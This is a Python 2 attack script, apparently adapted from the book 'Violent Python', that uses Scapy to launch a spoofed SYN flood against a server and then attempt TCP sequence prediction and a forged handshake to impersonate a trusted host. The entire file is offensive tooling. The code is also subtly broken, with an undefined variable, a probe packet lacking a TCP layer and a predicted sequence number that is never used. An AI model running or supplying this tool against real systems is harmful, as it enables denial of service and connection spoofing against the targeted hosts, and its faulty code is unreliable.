#!/usr/bin/env python2
# written by Moses Arocha
# Written with the help of TJ O'Connor in his book "Violent Python"

from scapy.all import *

import optparse
import sys
import os


# Attempts to silence the server by sending SYN Packets to the silence the server and if it doesn't succeed it will end.
def SynAttack(src, target):
    for sport in range(1024, 65535):
	IPlayer = IP(src=src, dst=target)
	TCPlayer = TCP(sport=sport, dport=80)	# Will attack the server on port 80.
	pkt = IPlayer / TCPlayer
	send(pkt)		


# Will grab the sequence number of the TCP packets sent, after grabbing the increasing numbers, subtract them, then will tell the difference
def callTSN(target):
    PredictSequence = 0
    preNum = 0
    diffSeq = 0
    for x in range(1, 5):			
	if preNum != 0:
	    preNum = PredictSequence
	pkt = IP(dst=target)
	ans = sr1(pkt, verbose=0)
	PredictSequence = ans.getlayer(TCP).seq		# Important: May or may not work, depending on the enviroment run on.
	diffSeq = PredictSequence - repNum		
	print '\t[+] TCP Sequence Difference: ' + str(diffSeq)
    return PredictSequence + diffSeq


# Will then attempt to spoof the connection, by sending in packets from the Host, to the attacking target.
# This program will go through the entire SYN-ACK handshake, first it will send the SYN packet, then the ACK packet.
def AttemptSpoof(src, target, ack):
    IPlayer = IP(src=src, dst=target)
    TCPlayer = TCP(sport=80, dport=81)
    synPkt = IPlayer / TCPlayer		# The creation of the SYN Packet
    send(synPkt)				# (Sending the SYN Packet)
    IPlayer = IP(src=src, dst=target)
    TCPlayer = TCP(sport=80, dport=81)
    ackPkt = IPlayer / TCPlayer		# The creation of the ACK Packet
    send(ackPkt)				# (Sending the ACK Packet)


def main():
    if not os.geteuid() == 0:				# Important: user must run code in UID 0.
        sys.exit('\tMust Be Root!')
    parser = optparse.OptionParser("Usages From Program: -S <Source for SYN Flood> -R <Source for Spoofed Connection> -T <Target Address>")
    parser.add_option('--SRC', dest='synSpoof', type='string', help='Specific src for SYN Flood')
    parser.add_option('--SPOOF', dest='srcSpoof', type='string', help='Specific src for spoofed connection')
    parser.add_option('--TAR', dest='target', type='string', help='specify target address')
    (options, args) = parser.parse_args()
    if options.synSpoof == None or options.srcSpoof == None or options.target == None:
        print parser.usage
	exit(0)
    else:
	synSpoof = options.synSpoof
	srcSpoof = options.srcSpoof
	target = options.target
    print '\t[+] Starting SYN Flood To Kill Server'
    SynAttack(synSpoof, srcSpoof)			
    print '\t[+] Calculating correct TCP Sequence Number'
    PredictSequence = callTSN(target) + 1				
    print '\t[+] Attempting To Spoof TCP Connection'
    AttemptSpoof(srcSpoof, target, PredictSequence)		
    print '\t[+] Task Complete'
	
	
if __name__ == '__main__':
    main()
